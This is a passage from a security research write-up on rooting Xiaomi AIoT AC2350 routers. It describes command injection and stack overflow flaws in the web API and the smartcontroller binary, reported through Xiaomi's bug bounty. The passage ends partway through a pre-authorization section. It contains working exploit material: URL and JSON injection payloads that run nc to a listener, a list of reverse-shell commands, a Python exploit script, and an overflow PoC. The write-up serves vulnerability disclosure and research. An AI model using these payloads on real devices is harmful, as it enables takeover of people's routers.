---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-09-25_rooting-xiaomi-wifi-routers.md
original_filename: 2023-09-25_rooting-xiaomi-wifi-routers.md
title: Rooting Xiaomi WiFi Routers
category: documents
detected_topics:
- command-injection
- api-security
- supply-chain
- oauth
- sso
- access-control
tags:
- imported
- documents
- command-injection
- api-security
- supply-chain
- oauth
- sso
- access-control
language: en
raw_sha256: 82676b0790eb0d94d06383b7f214ed29ecb70eec707e40bde2da588e01c57309
text_sha256: 921d252ab6397817b933a634be17b7979230269ed370de30468672c9203af5aa
ingested_at: '2026-06-28T07:32:26Z'
sensitivity: unknown
redactions_applied: false
---

# Rooting Xiaomi WiFi Routers

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-09-25_rooting-xiaomi-wifi-routers.md
- Source Type: markdown
- Detected Topics: command-injection, api-security, supply-chain, oauth, sso, access-control
- Ingested At: 2026-06-28T07:32:26Z
- Redactions Applied: False
- Raw SHA256: `82676b0790eb0d94d06383b7f214ed29ecb70eec707e40bde2da588e01c57309`
- Text SHA256: `921d252ab6397817b933a634be17b7979230269ed370de30468672c9203af5aa`


## Content

---
title: "Rooting Xiaomi WiFi Routers"
url: "https://blog.thalium.re/posts/rooting-xiaomi-wifi-routers/"
final_url: "https://blog.thalium.re/posts/rooting-xiaomi-wifi-routers/"
authors: ["Julien R.", "Marin Duroyon"]
programs: ["Xiaomi"]
bugs: ["OS command injection", "Buffer Overflow", "Memory corruption", "Security code review"]
publication_date: "2023-09-25"
added_date: "2023-10-03"
source: "pentester.land/writeups.json"
original_index: 747
---

# Rooting Xiaomi WiFi Routers

# Table of contents

  * Table of contents
  * Introduction
  * Environment
  * Attack Surface
  * LAN
  * WAN
  * Vulnerability Details
  * LAN
  * Post-authorization
  * Endpoint `/api/xqnetwork/set_wan6` \- Command Injection (already known as CVE-2020-14100)
  * Endpoint `/api/xqsmarthome/request_smartcontroller` \- Command Injection (CVE-2023-26319)
  * Endpoint `/api/xqsmarthome/request_smartcontroller` \- Stack Buffer Overflow (CVE-2023-26318)
  * Endpoint `/api/xqsmarthome/request_smartcontroller` \- Another Command Injection
  * Pre-authorization
  * Endpoint `/api/misystem/get_wifi_pwd_url` \- pk_free()
  * Endpoint `/api/misystem/get_wifi_pwd_url` \- Stack Buffer Overflow (already known as CVE-2020-14124)
  * Endpoint `/api/misystem/get_wifi_pwd_url` \- memcmp()
  * WAN
  * Binary `/usr/bin/messagingagent` \- Command Injection (CVE-2023-26317)
  * Binary `/usr/bin/messagingagent` \- Stack Buffer Overflow (CVE-2023-26320)
  * Some affected products
  * Conclusion
  * Timeline

# Introduction

Our research focused on the `MI AIoT Router AC2350` with the aim to obtain remote code execution on the LAN and WAN interfaces. We found several vulnerabilities in the router that allow an attacker to gain root access to the router. We sent 8 reports to Xiaomi on their [HackerOne bug bounty program](https://hackerone.com/xiaomi?type=team) — all the bugs should be fixed in the latest firmware updates according to them.

Previous research by [Aobo Wang and Jihong Zheng at Hitcon 2020](https://hitcon.org/2020/slides/Exploit%20\(Almost\)%20All%20Xiaomi%20Routers%20Using%20Logical%20Bugs.pdf) demonstrated various vulnerabilities in Xiaomi routers. However, during our analysis of the `MI AIoT Router AC2350,` we found that certain bugs, previously identified by Wang and Zheng in 2020, were still present. It seems these vulnerabilities hadn’t been rectified in the most recent firmware updates for our router, including [Global 3.0.36 and China 1.3.8](https://miuirom.org/miwifi/mi-aiot-router-ac2350). They had only been fixed in the router version specified in the CVE descriptions, namely the `Mi AIoT Router AX3600.` As a result, we have decided to inform Xiaomi of these re-discovered bugs alongside our new ones.

# Environment

Xiaomi sells a wide variety of WiFi routers based on [OpenWrt](https://openwrt.org/). Therefore, the web functions are served through OpenWrt’s `luci` Lua package. Fortunately, in comparison to other firmwares from Xiaomi routers, the Lua scripts containing the web functions were not encrypted, allowing us to easily analyze the code and pinpoint the API functions.

All binaries are executed as `root` and, therefore, any vulnerability that allows arbitrary code execution on the router will result in a `root` access. This is interesting as even a command injection found through the web interface results in the highest level of access to the operating system.

Similarly to most WiFi routers, an authentication portal is available on the router’s web interface and different permission levels protect access to certain API functions. After authenticating on the web portal, a token is generated and is sent in the URL to signify that the user is authenticated. This authorization token can be found in the `stok` URL parameter.

[![logged in](/posts/img/xiaomi-routers/lan_logged_in.png)](/posts/img/xiaomi-routers/lan_logged_in.png)

Furthermore, it is important to keep in mind that the router runs on a `32-bit big-endian MIPS CPU`: to get more tools than what the firmware’s `busybox` can offer (e.g. `gdb`, `gdbserver`, `strace`, `socat` …), we can, for example, look for [precompiled binaries](https://github.com/darkerego/mips-binaries) online or build a complete toolchain using [buildroot](https://github.com/buildroot/buildroot) to compile a kernel with a filesystem in order to emulate the router with `QEMU`.

Finally, we can note that even if most of the binaries are compiled without any protections (no PIE, no NX, no stack canary, partial/no RELRO), ASLR is active on the router. The big-endianness does not allow us to only overwrite the end of addresses in the same way we could in little endian. In addition, non-PIE binaries are mapped at the virtual address `0x00400000` which starts with a null byte and will cause us some issues later for exploitation.

# Attack Surface

WiFi routers have two accessible interfaces, LAN and WAN: the LAN interface is accessible once a device is connected to its WiFi and the WAN interface is accessible through the internet.

Within the LAN interface, we can further distinguish pre-authorization and post-authorization attacks. Pre-authorization attacks can be done without authentication, by any device connected to the WiFi, while post-authorization attacks require authentication (user:password) on the router’s web interface, accessible at `http://192.168.31.1`.

[![not logged in](/posts/img/xiaomi-routers/lan_not_loggedin.png)](/posts/img/xiaomi-routers/lan_not_loggedin.png)

## LAN

For LAN vulnerabilities, we focused on the web API functions to execute commands on the router.

To analyze all API functions we scraped every file containing the string `entry({"api"` as this turned out to be the endpoint source. Furthermore, this technique lets us identify the associated functions and authorization levels required to execute the different API calls.
  
  
  soeasy@ubuntu:~/router/fs $ grep -Rs "entry({\"api"
  [...]
  usr/lib/lua/luci/controller/api/xqnetwork.lua:  entry({"api", "xqnetwork", "set_wifi_weak"}, call("setWifiWeakInfo"), (""), 286)
  usr/lib/lua/luci/controller/api/xqnetwork.lua:  entry({"api", "xqnetwork", "get_wifi_weak"}, call("getWifiWeakInfo"), (""), 287)
  usr/lib/lua/luci/controller/api/xqnetwork.lua:  entry({"api", "xqnetwork", "set_wan6"}, call("setWan6"), (""), 223, 0x08)
  usr/lib/lua/luci/controller/api/xqnetwork.lua:  entry({"api", "xqnetwork", "ipv6_status"}, call("ipv6Status"), (""), 223, 0x08)
  usr/lib/lua/luci/controller/api/xqnetwork.lua:  entry({"api", "xqnetwork", "miscan_switch"}, call("miscanSwitch"), (""), 290)
  usr/lib/lua/luci/controller/api/xqnetwork.lua:  entry({"api", "xqnetwork", "get_miscan_switch"}, call("getMiscanSwitch"), (""), 291)
  usr/lib/lua/luci/controller/api/xqnetwork.lua:  entry({"api", "xqnetwork", "set_wifi_txbf"}, call("setWifiTxbf"), (""), 295)
  usr/lib/lua/luci/controller/api/xqnetwork.lua:  entry({"api", "xqnetwork", "set_wifi_ax"}, call("setWifiAx"), (""), 296)
  usr/lib/lua/luci/controller/api/xqsmarthome.lua:  entry({"api", "xqsmarthome"}, firstchild(), _(""), 500)
  usr/lib/lua/luci/controller/api/xqsmarthome.lua:  entry({"api", "xqsmarthome", "request"}, call("tunnelSmartHomeRequest"), _(""), 501)
  usr/lib/lua/luci/controller/api/xqsmarthome.lua:  entry({"api", "xqsmarthome", "request_smartcontroller"}, call("tunnelSmartControllerRequest"), _(""), 502)
  usr/lib/lua/luci/controller/api/xqsmarthome.lua:  entry({"api", "xqsmarthome", "request_miio"}, call("tunnelMiioRequest"), _(""), 503)
  usr/lib/lua/luci/controller/api/xqsmarthome.lua:  entry({"api", "xqsmarthome", "request_mitv"}, call("requestMitv"), _(""), 504)
  usr/lib/lua/luci/controller/api/xqsmarthome.lua:  entry({"api", "xqsmarthome", "request_yeelink"}, call("tunnelYeelink"), _(""), 505)
  usr/lib/lua/luci/controller/api/xqsmarthome.lua:  entry({"api", "xqsmarthome", "request_camera"}, call("requestCamera"), _(""), 506)
  usr/lib/lua/luci/controller/api/xqsmarthome.lua:  entry({"api", "xqsmarthome", "request_miiolist"}, call("requestMiioList"), _(""), 507)
  
  soeasy@ubuntu:~/router/fs $ grep -Rs "entry({\"api" | wc -l
  476
  

We can then interpret each line like this:
  
  
  --- API endpoint: `/api/xqnetwork/pppoe_catch` - Corresponding Lua function: `pppoeCatch()` - Authorization Flag: `0x09`
  entry({"api", "xqnetwork", "pppoe_catch"}, call("pppoeCatch"), (""), 264, 0x09)
  

To understand the authorization flags, which is visibly a custom feature that Xiaomi implemented because it’s not in the [original luci’s source code](https://github.com/openwrt/luci/blob/b17650fbd23ee9028b8a7aa55e3a9615ddf934f8/modules/luci-lua-runtime/luasrc/dispatcher.lua#L50), we can have a look at the flag checking functions in `/usr/lib/lua/luci/dispatcher.lua`.
  
  
  [...]
  function _remoteAccessForbidden(flag)
  if flag == nil then
  return false
  end
  if bit.band(flag, 0x02) == 0x02 then
  return true
  else
  return false
  end
  end
  [...]
  

The different authorization flags are the following, and can of course be combined:

  * `0x01`: “_noauthAccessAllowed”
  * `0x02`: “_remoteAccessForbidden”
  * `0x04`: “_syslockAccessAllowed”
  * `0x08`: “_noinitAccessAllowed”
  * `0x10`: “_sdkFilter”

We found roughly 500 API endpoints and initiated the grunt work of analyzing all of them, separating them into categories based on their permission levels. The first target functions in the Lua code were `os.execute`, `forkExec`, `io.popen`… as they allow direct command execution on the router. However, we also dove into the functions that branched out to router binaries in order to find lower-level vulnerabilities through reverse engineering.

Indeed, certain API functions will directly invoke binaries with user-controlled parameters through the URL to perform some tasks. Meaning, if the called binary is vulnerable, a specially crafted URL could potentially lead to code execution in the called program.

## WAN

For WAN vulnerabilities, we approached the problem by following Pwn2Own’s method of intercepting the traffic on the WAN interface. Acting as a man-in-the-middle, we emulated a `DHCP` and `DNS` server using `dnsmasq`, thus redirecting the traffic to our machine. We noticed many `HTTP` requests, giving us and any attackers the ability to intercept and modify the traffic. This proved to be fruitful in finding vulnerabilities as we will later see in this article.

# Vulnerability Details

In this section, we will detail the multiple vulnerabilities we found in the router. The initial goal was to have a root shell on the router as it would be useful for future debugs. We followed a bottom-up approach regarding the level of authorization: consequently, we first looked at the LAN interface with the highest level of authorization (LAN post-auth), continued with LAN pre-auth, and finished with WAN.

## LAN

To analyze the LAN attack surfaces we only focused on the web interface. Meaning, our research consisted in following the different endpoints and statically auditing their code.

### Post-authorization

Post-authorization means that an authentication token is sent with the request, so the admin password is required. In the end, we found three RCEs on the LAN post-authorization surface. While two of these bugs were duplicates, they still served their purpose as a foothold onto the router which drastically helped in the search for other vulnerabilities.

#### Endpoint `/api/xqnetwork/set_wan6` \- Command Injection (already known as CVE-2020-14100)

The first vulnerability was a known RCE from 2020. An unsanitized url parameter is injected into a shell command thus resulting in arbitrary command injection. This command injection is known by Xiaomi, however, it was not fixed in this particular firmware.

The API endpoint `/api/xqnetwork/set_wan6`, used to set IPv6 settings, calls the function `setWan6()` in `/usr/lib/lua/luci/controller/api/xqnetwork.lua`, and accepts multiple url parameters. The url parameter `dns1` can be abused to inject commands in the `XQFunction.forkExec()` method, which executes bash commands on the router. This vulnerability can be seen here:
  
  
  function index()
  local page  = node("api","xqnetwork")
  page.target  = firstchild()
  page.title  = ("")
  page.order  = 200
  page.sysauth = "admin"
  page.sysauth_authenticator = "jsonauth"
  page.index = true
  [...]
  entry({"api", "xqnetwork", "set_wan6"}, call("setWan6"), (""), 223, 0x08)
  [...]
  
  function setWan6()
  [...]
  --- `dn1` is retrieved here
  local dns1 = XQSecureUtil.parseCmdline(LuciHttp.formvalue("dns1"))
  local dns2 = XQSecureUtil.parseCmdline(LuciHttp.formvalue("dns2"))
  
  if XQFunction.isStrNil(wanType)
  and XQFunction.isStrNil(ip6addr)
  and XQFunction.isStrNil(ip6gw)
  and XQFunction.isStrNil(ip6prefix) then
  code = 1502
  else
  if wanType == "native" then
  if XQFunction.isStrNil(dns1) and XQFunction.isStrNil(dns2) then
  XQFunction.forkExec("sleep 2; /etc/init.d/ipv6 native")
  elseif not XQFunction.isStrNil(dns1) and XQFunction.isStrNil(dns2) then
  XQFunction.forkExec("sleep 2; /etc/init.d/ipv6 native " .. dns1)
  elseif XQFunction.isStrNil(dns1) and not XQFunction.isStrNil(dns2) then
  XQFunction.forkExec("sleep 2; /etc/init.d/ipv6 native " .. dns2)
  else
  --- `dns1` is injected into a shell command here by a simple concatenation!
  XQFunction.forkExec(
  "sleep 2; /etc/init.d/ipv6 native " .. dns1 .. ',' .. dns2
  )
  [...]
  

The potentially problematic function here would be the parsing function `XQSecureUtil.parseCmdline`, declared in `/usr/lib/lua/xiaoqiang/util/XQSecureUtil.lua`, which will attempt to sanitize the input by escaping different characters.
  
  
  function parseCmdline(str)
  if XQFunction.isStrNil(str) then
  return ""
  else
  return str:gsub("\\", "\\\\")
  :gsub("`", "\\`")
  :gsub("\"", "\\\"")
  :gsub("%$", "\\$")
  :gsub("%&", "\\&")
  :gsub("%|", "\\|")
  :gsub("%;", "\\;")
  end
  end
  

Plagued by a shell command injection, the `dns1` variable can be populated with `\n` (`0x0a` in hex) to add arbitrary commands. Indeed, `\n` bypasses the security checks done by the function `XQSecureUtil.parseCmdline`. For instance, the following payload injected in the API URL makes a `netcat` connection request on IP `192.168.31.161` and port `8282`: `dns1=anything%0anc 192.168.31.161 8282`

Example URL: `http://192.168.31.1/cgi-bin/luci/;stok=3ab3ea7324a1eb604be37dff197cf504/api/xqnetwork/set_wan6?wanType=native&dns1=anything%0anc%20192.168.31.161%208282`

We can execute any command on the router, with some limitations. Certain characters are escaped with a backslash, but we can then just run a `sed` to remove the backslash to “de-escape” the characters. For instance, the following list of commands pops a reverse shell on the router:
  
  
  commands = [
  f"rm -f /tmp/f",
  f"mknod /tmp/f p",
  f"echo 'cat /tmp/f|sh -i 2>&1|nc {IP} {PORT} >/tmp/f' > revshell.sh",
  f'sed -i \'s/\\//g\' revshell.sh',
  f"sh revshell.sh"
  ]
  

Thus, we have a reverse shell on the router:

[![RCE](/posts/img/xiaomi-routers/setwan6_rce.png)](/posts/img/xiaomi-routers/setwan6_rce.png)

This vulnerability is in fact a duplicate of [CVE-2020-14100](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14100) and we rediscovered it by accident. But we now have our first root reverse shell on the router with no restriction on the entire filesystem, great!

#### Endpoint `/api/xqsmarthome/request_smartcontroller` \- Command Injection (CVE-2023-26319)

The post-authorization API endpoint `/api/xqsmarthome/request_smartcontroller`, which seeks to interact with smart-home devices on the network, is implemented in `/usr/lib/lua/luci/controller/api/xqsmarthome.lua` and accepts the url parameter `payload`.
  
  
  function index()
  local page  = node("api","xqsmarthome")
  page.target  = firstchild()
  page.title  = ("")
  page.order  = 500
  -- We have to be authenticated to access this API
  page.sysauth = "admin"
  page.sysauth_authenticator = "jsonauth"
  page.index = true
  entry({"api", "xqsmarthome"}, firstchild(), _(""), 500)
  entry({"api", "xqsmarthome", "request"}, call("tunnelSmartHomeRequest"), _(""), 501)
  -- API endpoint `request_smartcontroller` is defined here 
  entry({"api", "xqsmarthome", "request_smartcontroller"}, call("tunnelSmartControllerRequest"), _(""), 502)
  entry({"api", "xqsmarthome", "request_miio"}, call("tunnelMiioRequest"), _(""), 503)
  entry({"api", "xqsmarthome", "request_mitv"}, call("requestMitv"), _(""), 504)
  entry({"api", "xqsmarthome", "request_yeelink"}, call("tunnelYeelink"), _(""), 505)
  entry({"api", "xqsmarthome", "request_camera"}, call("requestCamera"), _(""), 506)
  entry({"api", "xqsmarthome", "request_miiolist"}, call("requestMiioList"), _(""), 507) 
  end
  
  [...]
  
  function tunnelSmartControllerRequest()
  local XQLog = require("xiaoqiang.XQLog")
  local XQCryptoUtil = require("xiaoqiang.util.XQCryptoUtil")
  local LuciJson = require("json")
  local http_data = LuciJson.decode(LuciHttp.formvalue("payload"))
  -- Our `payload` is base64 encoded
  local payload = XQCryptoUtil.binaryBase64Enc(LuciHttp.formvalue("payload"))
  
  [...]
  
  local cmd = XQConfigs.THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER % payload
  local LuciUtil = require("luci.util")
  -- Some command containing our `payload` is executed here
  LuciHttp.write(LuciUtil.exec(cmd))
  end
  

Here we can see that our `payload` will be base64 encoded and then formatted into the string `XQConfigs.THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER` and that the result will be executed with `LuciUtil.exec`. Let’s take a look at the value of `XQConfigs.THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER` in `/usr/lib/lua/xiaoqiang/common/XQConfigs.lua`.
  
  
  THRIFT_TUNNEL_TO_DATACENTER = "thrifttunnel 0 '%s'"
  THRIFT_TUNNEL_TO_SMARTHOME = "thrifttunnel 1 '%s'"
  THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER = "thrifttunnel 2 '%s'"
  THRIFT_TO_MQTT_IDENTIFY_DEVICE = "thrifttunnel 3 ''"
  THRIFT_TO_MQTT_GET_SN = "thrifttunnel 4 ''"
  THRIFT_TO_MQTT_GET_DEVICEID = "thrifttunnel 5 ''"
  THRIFT_TUNNEL_TO_MIIO = "thrifttunnel 6 '%s'"
  THRIFT_TUNNEL_TO_YEELINK = "thrifttunnel 7 '%s'"
  THRIFT_TUNNEL_TO_CACHECENTER = "thrifttunnel 8 '%s'"
  

This `payload` will thus be passed to the binary `thrifttunnel` by executing the command: `thrifttunnel 2 '[BASE64 PAYLOAD]'`.

While taking a look at the `thrifttunnel` binary, we can see that the choice `2` will “transfer” the payload to a service called `smartcontroller` through the `ubus` IPC system.
  
  
  // _ftext is basically the main function of the `thrifttunnel` binary
  int32_t _ftext(int32_t argc, char** argv, char** envp) {
  [...]
  case 2:
  {
  uloop_init();
  int32_t _ubus_ctx = ubus_connect(data_412050);
  ubus_ctx = _ubus_ctx;
  int32_t ubus_id;
  
  if (_ubus_ctx != 0)
  {
  uloop_fd_add((_ubus_ctx + 0x2c), 9);
  ubus_id = ubus_lookup_id(ubus_ctx, "smartcontroller", 0x412074);
  
  if (ubus_id == 0)
  {
  blob_buf_init(0x41205c, 0);
  blobmsg_add_field(0x41205c, 3, "request", s2_1, (strlen(s2_1) + 1));
  s0_4 = nullptr;
  int32_t v0_19 = ubus_invoke_fd(ubus_ctx, data_412074, "process_request", data_41205c, 0x400f00, 0, 0x1388, 0xffffffff);
  a0_11 = ubus_ctx;
  [...]
  

We can simplify this process by saying that the payload is finally passed as an argument to the `/usr/sbin/smartcontroller` binary.

While looking for vulnerabilities in this `smartcontroller` binary, we noticed that a command injection is possible through a `mac` parameter and could allow remote code execution if it could be reached. This vulnerability is located in the function at `0x4061d4` which we renamed `run_sysapi_macfilter`.
  
  
  int32_t run_cmd(char* cmd)
  {
  int32_t ret = 0;
  
  if (is_empty_str(cmd) == 0)
  {
  log(2, "system command: %s\n", cmd);
  int32_t system_res;
  int32_t a2_2;
  
  // Command executed using the `sytem()` function
  system_res = system(cmd);
  ret = 1;
  
  if (system_res != 0)
  {
  log(2, "system call error\n", a2_2);
  ret = 0;
  }
  }
  return ret;
  }
  
  // the `mac` parameter is user controlled
  int32_t run_sysapi_macfilter(char* mac, int32_t enabled)
  {
  char* const yes_no;
  char cmd_buffer[0x64];
  memset(&cmd_buffer, 0, 0x64);
  
  if (enable != 0)
  {
  yes_no = "no";
  }
  else
  {
  yes_no = "yes";
  }
  
  sprintf(&cmd_buffer,
  "/usr/sbin/sysapi macfilter set mac=%s wan=%s;/usr/sbin/sysapi macfilter commit",
  mac,
  a3);
  // `mac` is directly injected into `system()`!
  return run_cmd(&cmd_buffer);
  }
  

Since the `mac` parameter is user-controlled and directly passed to `run_cmd`, we could execute any command on the router, but we first need to understand how to interact correctly with the `smartcontroller` binary to reach this interesting function.

While reversing the `smartcontroller` binary, we can see that the payload must be formatted as JSON with a “command” field. We can see the different possible commands in a function we named `scene_command_parser` at `0x401dc0`.
  
  
  int32_t scene_command_parser(char* command)
  {
  void* json_object;
  int32_t a2;
  json_object = json_tokener_parse(command);
  char const* const error_msg;
  if (json_object == 0)
  {
  error_msg = "request is not a json object\n";
  }
  else
  {
  void* cmd_json_object;
  cmd_json_object = json_object_object_get(json_object, "command");
  if (cmd_json_object != 0)
  {
  int32_t cmd_string = json_object_get_string(cmd_json_object);
  int32_t s0_3;
  int32_t v0_11;
  if (strcmp(cmd_string, "scene_setting") == 0)
  {
  int32_t v0_12;
  int32_t a2_6;
  v0_12 = strcmp(cmd_string, "get_scene_setting");
  if (v0_12 == 0)
  {
  if (strcmp(cmd_string, "get_single_scene_setting") == 0)
  {
  if (strcmp(cmd_string, "get_multiple_scene_setting") == 0)
  {
  if (strcmp(cmd_string, "scene_update") == 0)
  {
  if (strcmp(cmd_string, "scene_start") == 0)
  {
  if (strcmp(cmd_string, "scene_stop") == 0)
  {
  if (strcmp(cmd_string, "scene_launch") == 0)
  {
  if (strcmp(cmd_string, "scene_launch_delete") == 0)
  {
  if (strcmp(cmd_string, "scene_delete") == 0)
  {
  if (strcmp(cmd_string, "scene_start_by_device_status") == 0)
  {
  if (strcmp(cmd_string, "is_scene_processing") == 0)
  {
  if (strcmp(cmd_string, "get_scene_count") == 0)
  {
  if (strcmp(cmd_string, "reset_scenes") == 0)
  {
  if (strcmp(cmd_string, "scene_start_by_crontab") != 0)
  {
  

> For those of you who are really paying attention, we can see here that the `strcmp` returns 0 if the strings are not equal, which is the opposite of what normally happens: this is because the `strcmp` used here is a custom implementation.

In this same function, we can see the only cross-reference to the function `run_sysapi_macfilter` that is interesting for us, in the case of the command “scene_setting”.

After a little more reverse engineering of the command parsing process, we built the following payload for the API `/api/xqsmarthome/request_smartcontroller` that can then be used to POC the RCE by creating a new “scene” with the command `scene_setting` that will block a MAC address - which will, in fact, be our command injection payload.
  
  
  {
  "command":"scene_setting",
  "name":"it3",
  "action_list":[
  {
  "thirdParty":"xmrouter",
  "delay":17,
  "type":"wan_block",
  "payload":
  {
  "command":"wan_block",
  // Command Injection - making an exterior connection
  "mac":";nc 192.168.31.161 4242;#"
  }
  }
  ],
  "launch":
  {
  "timer":
  {
  "time":"2:2",
  "repeat":"0",
  "enabled":true
  }
  }
  }
  

Then, we need to start this scene by using the command `scene_start_by_crontab`.
  
  
  {
  "command":"scene_start_by_crontab",
  "time":"2:2",
  "week":0
  }
  

A simple python script can be written to exploit the vulnerability:
  
  
  import requests
  
  AUTH_TOKEN = "bd3ff46458f812a97b4e9f10945c6ce5"
  
  URL = f"http://192.168.31.1/cgi-bin/luci/;stok={AUTH_TOKEN}/api/xqsmarthome/request_smartcontroller"
  
  command = "nc 192.168.31.161 4242"
  
  requests.post(URL, data={
  "payload":'{"command":"scene_setting","name":"it3","action_list":[{"thirdParty":"xmrouter","delay":17,"type":"wan_block","payload":{"command":"wan_block","mac":";' + command + ';#"}}],"launch":{"timer":{"time":"2:2","repeat":"0","enabled":true}}}'
  })
  requests.post(URL, data={
  "payload":'{"command":"scene_start_by_crontab","time":"2:2","week":0}'
  })
  

This way, we receive a connection with our listener:

[![smartcontroller_rce](/posts/img/xiaomi-routers/sc_os_injection_exterior_conn.png)](/posts/img/xiaomi-routers/sc_os_injection_exterior_conn.png)

With this `system` injection in the `/usr/sbin/smartcontroller` binary, we can now validate another LAN post-authorization RCE vulnerability, which is not a duplicate this time!

#### Endpoint `/api/xqsmarthome/request_smartcontroller` \- Stack Buffer Overflow (CVE-2023-26318)

In the same portion of code as the vulnerability above, we can see that `smartcontroller` is also vulnerable to a stack buffer overflow. The `mac` parameter, which is user-controlled, is directly injected into a stack buffer using `sprintf()`, which means the length of the string copied to `cmd_buffer` is not checked.
  
  
  // the `mac` parameter is user controlled
  int32_t run_sysapi_macfilter(char* mac, int32_t enabled)
  {
  char* const yes_no;
  char cmd_buffer[0x64];
  memset(&cmd_buffer, 0, 0x64);
  
  if (enable != 0)
  {
  yes_no = "no";
  }
  else
  {
  yes_no = "yes";
  }
  
  // `mac` is directly injected into the `cmd_buffer` (stack buffer) without length check! 
  sprintf(&cmd_buffer,
  "/usr/sbin/sysapi macfilter set mac=%s wan=%s;/usr/sbin/sysapi macfilter commit",
  mac,
  a3);  
  return run_cmd(&cmd_buffer);
  }
  

We can then produce a quick PoC to overwrite the return address and set the program counter `PC` to `0xdeadbeef`:

  * First payload

  
  
  {
  [...]
  // payload is basically the same as the previous one
  // mac: A * 81 + 0xdeadbeef (URL encoded)
  "mac":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%de%ad%be%ef"
  [...]
  }
  

  * Second payload

  
  
  {
  "command":"scene_start_by_crontab",
  "time":"2:2",
  "week":0
  }
  

We can then check in gdb that we effectively control the `PC`:

[![0xdeadbeef](/posts/img/xiaomi-routers/sc_deadbeef.png)](/posts/img/xiaomi-routers/sc_deadbeef.png)

Unfortunately, since the vulnerability comes from the use of `sprintf` with a `%s` formatter, we cannot use NULL bytes in the payload. Consequently, we cannot use ROP gadgets to execute arbitrary code within the binary as we know that the base address of the binary is `0x00400000` (starting with a NULL byte) and that we can’t just make a partial address overwrite due to the endianness.

An exploit would require an ASLR bruteforce (which is reasonable on a 32-bit system) or an ASLR leak for example. Unfortunately, the binary is not restarted when it crashes, thus making the bruteforce pretty much impossible, but it is still a DoS. Since we had already discovered several RCEs, we decided not to spend too much time on this non-trivial vulnerability exploitation.

#### Endpoint `/api/xqsmarthome/request_smartcontroller` \- Another Command Injection

After having submitted the previous reports to Xiaomi, we were happy with our LAN post-authorization research as we had found a way to obtain a root shell on the router and also found non-duplicate RCEs eligible for their bug bounty program.

Soon enough, however, a second read-through of the `smartcontroller` program revealed another command injection. Unfortunately, our previous report on the binary drew Xiaomi’s attention and they apparently found this injection shortly before our report. It was a duplicate once again but it taught us to fully finish a security audit before hastily reporting bugs.

This second command injection resides in the method that we renamed `feedPush` at `0x405384`. The `scene_name` parameter is directly injected in `system()` without any sanitization in the `run_cmd_arg` function.
  
  
  int32_t run_cmd_arg(char* cmd, char* arg)
  {
  int32_t ret;
  if (is_empty_str(cmd) != 0)
  {
  ret = 0;
  }
  else
  {
  if (is_empty_str(arg) != 0)
  {
  return run_cmd(cmd);
  }
  
  int32_t len = strlen(cmd) + strlen(arg) + 5;
  char* final_command = malloc(len);
  memset(final_command, 0, len);
  
  // Here, an attempt of escaping `arg` to try to avoid command injections 
  sprintf(final_command, "%s '%s'", cmd, arg);
  
  // The final command is then executed with `system()`
  ret = run_cmd(final_command);
  
  free(final_command);
  }
  return ret;
  }
  
  int32_t feedPush(scene_struct* scene)
  {
  json_object* new_dupe = json_object_new_object();
  json_object_object_add(new_dupe, "type", json_object_new_int(5));
  json_object* new_obj = json_object_new_object();
  
  // `scene_name` is user controlled
  json_object_object_add(new_obj, "name", json_object_new_string(scene->scene_name));
  
  [...]
  json_object_object_add(new_dupe, "data", new_obj);
  
  // user controlled data is duplicated and stringified
  char* duplicate_data = strdup(json_object_to_json_string(new_dupe));
  
  int32_t v0_6 = json_object_put(new_dupe);
  if (duplicate_data == 0)
  {
  return v0_6;
  }
  
  // `duplicate_data` is directly injected into `system()`
  run_cmd_arg("/usr/sbin/feedPush", duplicate_data);
  return free(duplicate_data);
  }
  

We can easily escape the quotes in `run_cmd_arg` by using a simple trick (`$(shell command)`) and inject the `scene_name`. To PoC this vulnerability, we can use those two payloads (again, similar to the previous ones):

  * First payload

  
  
  {
  "command":"scene_setting",
  // Command Injection - making an exterior connection
  "name":"'$(nc 192.168.31.98 4242)'",
  [...] // same as before
  }
  

  * Second payload

  
  
  {
  "command":"scene_start_by_crontab",
  "time":"2:2",
  "week":0
  }
  

This way, we receive a connection with our listener and confirm the RCE:

[![smartcontroller_rce_2](/posts/img/xiaomi-routers/sc_2_os_inject_exterior_conn.png)](/posts/img/xiaomi-routers/sc_2_os_inject_exterior_conn.png)

### Pre-authorization

We now know that the post-authorization LAN is affected by several bugs allowing us to get a root shell on the Xiaomi router: to do so, we need the admin password of the router’s web interface to retrieve the authentication token. Naturally, it would be even more interesting if we could bypass that step: our next phase is then to look at the pre-authorization LAN interface so that any user connected to the WiFi can exploit the router.

The vulnerabilities on this LAN pre-auth surface were found in the `lua_rsa_pubkey_encrypt()` method from Xiaomi’s `/usr/lib/lua/librsa.so` library. Using the endpoint’s name, we guess this function simplifies sharing the WiFi password through a link. This function is exposed before authentication via an API endpoint of the router’s interface: `http://192.168.31.1/cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=`.

#### Endpoint `/api/misystem/get_wifi_pwd_url` \- pk_free()

First, we can trigger a call to `pk_free()` from `libembedtls.so` on an uninitialized pointer in `public_encrypt_keybuf()` (called by `lua_rsa_pubkey_encrypt()`) when giving a malformed RSA public key. This bug could theoretically lead to Remote Code Execution by carefully organizing the stack as we will see.
  
  
  int32_t public_encrypt_keybuf(char* url, int32_t url_len, int32_t* arg3, int32_t* arg4, char* controlled_key, int32_t key_len)
  {
  int32_t ret_code;
  void* pk_ctx;
  int32_t b64_needed_len = 0;
  
  base64_decode(0, &b64_needed_len, controlled_key, key_len);
  if (sys_log_enable != 0)
  {
  syslog(6, " rsa crypto  base64_decode need …", b64_needed_len);
  }
  
  char* b64 = calloc((b64_needed_len + 1), 1);
  int32_t err_code = base64_decode(b64, &b64_needed_len, controlled_key, key_len);
  if (err_code == 0)
  {
  [..]
  }
  else
  {
  if (sys_log_enable != 0)
  {
  syslog(6, " rsa crypto  base64_decode faile…", err_code);
  }
  ret_code = 101;
  
  // This is freed but was never initialized if(err_code != 0) 
  pk_free(&pk_ctx);
  free(b64);
  }
  return ret_code;
  }
  

